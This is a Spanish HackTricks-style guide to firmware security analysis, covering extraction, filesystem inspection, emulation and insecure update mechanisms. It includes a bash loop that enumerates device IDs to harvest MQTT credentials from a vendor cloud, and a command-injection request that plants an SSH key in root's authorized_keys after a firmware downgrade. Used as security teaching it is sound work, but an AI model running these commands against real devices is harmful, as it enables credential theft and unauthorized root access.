# Análisis de firmware

{{#include ../../banners/hacktricks-training.md}}

## **Introducción**

### Recursos relacionados


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

Firmware es el software esencial que permite que los dispositivos funcionen correctamente al gestionar y facilitar la comunicación entre los componentes hardware y el software con el que interactúan los usuarios. Se almacena en memoria permanente, lo que asegura que el dispositivo pueda acceder a instrucciones vitales desde el momento en que se enciende, conduciendo al arranque del sistema operativo. Examinar y, potencialmente, modificar el firmware es un paso crítico para identificar vulnerabilidades de seguridad.

## **Recopilación de información**

**Recopilación de información** es un paso inicial crítico para comprender la composición de un dispositivo y las tecnologías que emplea. Este proceso implica recopilar datos sobre:

- La arquitectura de la CPU y el sistema operativo que utiliza
- Detalles del bootloader
- Distribución del hardware y hojas de datos (datasheets)
- Métricas de la base de código y ubicaciones del código fuente
- Librerías externas y tipos de licencia
- Historiales de actualizaciones y certificaciones regulatorias
- Diagramas arquitectónicos y de flujo
- Evaluaciones de seguridad y vulnerabilidades identificadas

Para este propósito, las herramientas de open-source intelligence (OSINT) son invaluables, al igual que el análisis de cualquier componente de software de código abierto disponible mediante procesos de revisión manual y automatizada. Herramientas como [Coverity Scan](https://scan.coverity.com) y [Semmle’s LGTM](https://lgtm.com/#explore) ofrecen análisis estático gratuitos que pueden aprovecharse para encontrar posibles problemas.

## **Adquisición del firmware**

Obtener firmware puede abordarse por diversos medios, cada uno con su propio nivel de complejidad:

- **Directamente** desde la fuente (desarrolladores, fabricantes)
- **Compilándolo** a partir de las instrucciones proporcionadas
- **Descargando** desde sitios de soporte oficiales
- Utilizar consultas de **Google dork** para encontrar archivos de firmware alojados
- Accediendo directamente al almacenamiento en la nube, con herramientas como [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Interceptando **actualizaciones** mediante técnicas man-in-the-middle
- **Extrayendo** desde el dispositivo mediante conexiones como **UART**, **JTAG** o **PICit**
- **Sniffing** de solicitudes de actualización dentro de la comunicación del dispositivo
- Identificar y usar **hardcoded update endpoints**
- **Dumping** desde el bootloader o la red
- **Retirar y leer** el chip de almacenamiento, cuando todo lo demás falla, usando herramientas de hardware apropiadas

## Analizando el firmware

Ahora que **tienes el firmware**, necesitas extraer información sobre él para saber cómo tratarlo. Diferentes herramientas que puedes usar para eso:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Si no encuentras mucho con esas herramientas, comprueba la **entropía** de la imagen con `binwalk -E <bin>`: si la entropía es baja, no es probable que esté cifrada. Si es alta, es probable que esté cifrada (o comprimida de alguna manera).

Además, puedes usar estas herramientas para extraer **archivos incrustados dentro del firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

O [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) para inspeccionar el archivo.

### Obtener el Filesystem

Con las herramientas mencionadas anteriormente, como `binwalk -ev <bin>`, deberías haber podido **extraer el filesystem**.\
Binwalk normalmente lo extrae dentro de una **carpeta nombrada según el tipo de filesystem**, que suele ser uno de los siguientes: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extracción manual del Filesystem

A veces, binwalk **no tendrá el byte mágico del filesystem en sus firmas**. En esos casos, usa binwalk para **encontrar el offset del filesystem y recuperar el filesystem comprimido** del binario y **extraer manualmente** el filesystem según su tipo usando los pasos siguientes.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Ejecute el siguiente **dd command** para extraer el sistema de archivos Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativamente, también se puede ejecutar el siguiente comando.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Para squashfs (utilizado en el ejemplo anterior)

`$ unsquashfs dir.squashfs`

Los archivos estarán en el directorio "`squashfs-root`" posteriormente.

- Para archivos CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Para sistemas de archivos jffs2

`$ jefferson rootfsfile.jffs2`

- Para sistemas de archivos ubifs con NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Análisis del firmware

Una vez obtenido el firmware, es esencial diseccionarlo para comprender su estructura y posibles vulnerabilidades. Este proceso implica utilizar diversas herramientas para analizar y extraer datos valiosos de la imagen del firmware.

### Herramientas de análisis inicial

Se proporciona un conjunto de comandos para la inspección inicial del archivo binario (denominado `<bin>`). Estos comandos ayudan a identificar tipos de archivo, extraer strings, analizar datos binarios y comprender los detalles de particiones y sistemas de archivos:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Para evaluar el estado de cifrado de la imagen, se comprueba la **entropía** con `binwalk -E <bin>`. Una entropía baja sugiere ausencia de cifrado, mientras que una entropía alta indica posible cifrado o compresión.

Para extraer **archivos embebidos**, se recomiendan herramientas y recursos como la documentación de **file-data-carving-recovery-tools** y **binvis.io** para inspección de archivos.

### Extracción del sistema de archivos

Usando `binwalk -ev <bin>` suele ser posible extraer el sistema de archivos, normalmente en un directorio llamado según el tipo de sistema de archivos (p. ej., squashfs, ubifs). Sin embargo, cuando **binwalk** no logra reconocer el tipo de sistema de archivos debido a la ausencia de bytes mágicos, es necesario realizar una extracción manual. Esto implica usar `binwalk` para localizar el offset del sistema de archivos, seguido del comando `dd` para extraer el sistema de archivos:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Después, según el tipo de filesystem (p. ej., squashfs, cpio, jffs2, ubifs), se usan distintos comandos para extraer manualmente el contenido.

### Análisis del sistema de archivos

Con el sistema de archivos extraído, comienza la búsqueda de fallos de seguridad. Se presta atención a daemons de red inseguros, credenciales hardcodeadas, endpoints de API, funcionalidades de servidores de actualización, código sin compilar, scripts de arranque y binarios compilados para análisis offline.

**Ubicaciones clave** y **elementos** para inspeccionar incluyen:

- **etc/shadow** y **etc/passwd** para credenciales de usuarios
- Certificados SSL y claves en **etc/ssl**
- Archivos de configuración y scripts por posibles vulnerabilidades
- Binarios embebidos para análisis adicional
- Servidores web y binarios comunes en dispositivos IoT

Varias herramientas ayudan a descubrir información sensible y vulnerabilidades dentro del sistema de archivos:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) and [**Firmwalker**](https://github.com/craigz28/firmwalker) para buscar información sensible
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) para análisis completo de firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), y [**EMBA**](https://github.com/e-m-b-a/emba) para análisis estático y dinámico

### Verificaciones de seguridad en binarios compilados

Tanto el código fuente como los binarios compilados encontrados en el sistema de archivos deben ser examinados en busca de vulnerabilidades. Herramientas como **checksec.sh** para binarios Unix y **PESecurity** para binarios Windows ayudan a identificar binarios no protegidos que podrían ser explotados.

## Recolección de configuración en la nube y credenciales MQTT mediante tokens de URL derivados

Muchos hubs IoT obtienen su configuración por dispositivo desde un endpoint en la nube que se ve así:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Durante el análisis del firmware puede que encuentres que <token> se deriva localmente del deviceId usando un secreto hardcodeado, por ejemplo:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Este diseño permite a cualquiera que conozca un deviceId y la STATIC_KEY reconstruir la URL y obtener la configuración en la nube, frecuentemente revelando credenciales MQTT en texto plano y prefijos de tópico.

Flujo de trabajo práctico:

1) Extraer deviceId de los registros de arranque UART

- Conecta un adaptador UART de 3.3V (TX/RX/GND) y captura los registros:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Busca líneas que impriman el patrón de URL de cloud config y la dirección del broker, por ejemplo:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Recuperar STATIC_KEY y algoritmo del token desde el firmware

- Carga los binarios en Ghidra/radare2 y busca la ruta de configuración ("/pf/") o el uso de MD5.
- Confirma el algoritmo (p. ej., MD5(deviceId||STATIC_KEY)).
- Derivar el token en Bash y convertir el digest a mayúsculas:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Recolectar la configuración en la nube y las credenciales MQTT

- Construye la URL y obtén el JSON con curl; analiza con jq para extraer secretos:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Abusar de MQTT en texto plano (plaintext) y de ACLs de topics débiles (si están presentes)

- Usar las credenciales recuperadas para suscribirse a topics de mantenimiento y buscar eventos sensibles:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerar identificadores de dispositivos predecibles (a escala, con autorización)

- Muchos ecosistemas incrustan bytes OUI del fabricante/producto/tipo seguidos de un sufijo secuencial.
- Puedes iterar identificadores candidatos, derivar tokens y obtener configuraciones programáticamente:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notas
- Obtén siempre autorización explícita antes de intentar enumeración masiva.
- Prefiere la emulación o el análisis estático para recuperar secretos sin modificar el hardware objetivo cuando sea posible.


El proceso de emular firmware permite **dynamic analysis** tanto del funcionamiento de un dispositivo como de un programa individual. Este enfoque puede encontrar desafíos por dependencias de hardware o arquitectura, pero transferir el root filesystem o binarios específicos a un dispositivo con arquitectura y endianness coincidentes, como un Raspberry Pi, o a una máquina virtual preconstruida, puede facilitar pruebas adicionales.

### Emulating Individual Binaries

Para examinar programas individuales, es crucial identificar el endianness y la arquitectura de la CPU del programa.

#### Example with MIPS Architecture

Para emular un binario de arquitectura MIPS, se puede usar el comando:
```bash
file ./squashfs-root/bin/busybox
```
Y para instalar las herramientas de emulación necesarias:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Para MIPS (big-endian), `qemu-mips` se usa, y para binarios little-endian, `qemu-mipsel` sería la opción.

#### Emulación de la arquitectura ARM

Para binarios ARM, el proceso es similar, utilizando el emulador `qemu-arm` para la emulación.

### Emulación de sistema completo

Herramientas como [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), y otras, facilitan la emulación completa del firmware, automatizando el proceso y ayudando en el análisis dinámico.

## Análisis dinámico en la práctica

En esta etapa se utiliza un entorno de dispositivo real o emulado para el análisis. Es esencial mantener acceso shell al OS y al sistema de ficheros. La emulación puede no reproducir perfectamente las interacciones con el hardware, lo que puede requerir reinicios de la emulación. El análisis debe volver a inspeccionar el sistema de ficheros, explotar páginas web expuestas y servicios de red, y explorar vulnerabilidades del bootloader. Las pruebas de integridad del firmware son críticas para identificar posibles backdoor.

## Técnicas de análisis en tiempo de ejecución

El análisis en tiempo de ejecución implica interactuar con un proceso o binario en su entorno operativo, usando herramientas como gdb-multiarch, Frida y Ghidra para establecer breakpoints e identificar vulnerabilidades mediante fuzzing y otras técnicas.

## Explotación binaria y Proof-of-Concept

Desarrollar un PoC para vulnerabilidades identificadas requiere un conocimiento profundo de la arquitectura objetivo y programación en lenguajes de bajo nivel. Las protecciones de tiempo de ejecución sobre binarios en sistemas embebidos son raras, pero cuando existen, pueden ser necesarias técnicas como Return Oriented Programming (ROP).

## Sistemas operativos preparados para análisis de firmware

Sistemas operativos como [AttifyOS](https://github.com/adi0x90/attifyos) y [EmbedOS](https://github.com/scriptingxss/EmbedOS) proporcionan entornos preconfigurados para pruebas de seguridad de firmware, equipados con las herramientas necesarias.

## OSs preparados para analizar Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS es una distro diseñada para ayudarte a realizar security assessment y penetration testing de Internet of Things (IoT) devices. Te ahorra mucho tiempo proporcionando un entorno pre-configurado con todas las herramientas necesarias cargadas.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Sistema operativo para pruebas de seguridad embebida basado en Ubuntu 18.04, preinstalado con herramientas para pruebas de seguridad de firmware.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Incluso cuando un proveedor implementa comprobaciones de firma criptográfica para imágenes de firmware, **la protección contra version rollback (downgrade) se omite con frecuencia**. Cuando el boot- o recovery-loader solo verifica la firma con una clave pública embebida pero no compara la *versión* (o un contador monotónico) de la imagen que se va a flashear, un atacante puede legítimamente instalar un **firmware más antiguo y vulnerable que aún conserva una firma válida** y así re-introducir vulnerabilidades parcheadas.

Flujo de ataque típico:

1. **Obtain an older signed image**
* Consíguela desde el portal público de descargas del proveedor, CDN o sitio de soporte.
* Extráela de aplicaciones móviles/escritorio complementarias (p. ej. dentro de un Android APK bajo `assets/firmware/`).
* Recupérala desde repositorios de terceros como VirusTotal, archivos de Internet, foros, etc.
2. **Upload or serve the image to the device** vía cualquier canal de actualización expuesto:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Muchos dispositivos IoT de consumo exponen *unauthenticated* endpoints HTTP(S) que aceptan blobs de firmware codificados en Base64, los decodifican en el servidor y activan la recuperación/actualización.
3. Tras el downgrade, explotar una vulnerabilidad que fue parcheada en la versión más reciente (por ejemplo, un filtro para command-injection que se agregó más tarde).
4. Opcionalmente volver a flashear la imagen más reciente o desactivar las actualizaciones para evitar la detección una vez que se consigue persistencia.

### Ejemplo: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
En el firmware vulnerable (downgraded), el parámetro `md5` se concatena directamente en un comando de shell sin sanitización, lo que permite la inyección de comandos arbitrarios (aquí – habilitando SSH key-based root access). Las versiones posteriores del firmware introdujeron un filtro básico de caracteres, pero la ausencia de protección contra downgrades hace que la corrección no sirva de nada.

### Extracting Firmware From Mobile Apps

Muchos proveedores incluyen imágenes completas de firmware dentro de sus aplicaciones móviles complementarias para que la app pueda actualizar el dispositivo vía Bluetooth/Wi-Fi. Estos paquetes suelen almacenarse sin cifrar en el APK/APEX bajo rutas como `assets/fw/` o `res/raw/`. Herramientas como `apktool`, `ghidra`, o incluso un simple `unzip` permiten extraer imágenes firmadas sin tocar el hardware físico.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Lista de verificación para evaluar la lógica de actualización

* ¿Está el transporte/autenticación del *update endpoint* adecuadamente protegido (TLS + authentication)?
* ¿El dispositivo compara **version numbers** o un **monotonic anti-rollback counter** antes de flashing?
* ¿La imagen se verifica dentro de una secure boot chain (e.g. signatures checked by ROM code)?
* ¿El userland code realiza comprobaciones de sanity adicionales (e.g. allowed partition map, model number)?
* ¿Los flujos de actualización *partial* o *backup* están reutilizando la misma validation logic?

> 💡  Si alguno de los anteriores falta, la plataforma probablemente sea vulnerable a rollback attacks.

## Vulnerable firmware to practice

Para practicar el descubrimiento de vulnerabilidades en firmware, usa los siguientes proyectos de firmware vulnerable como punto de partida.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Referencias

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Formación y Certificación

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
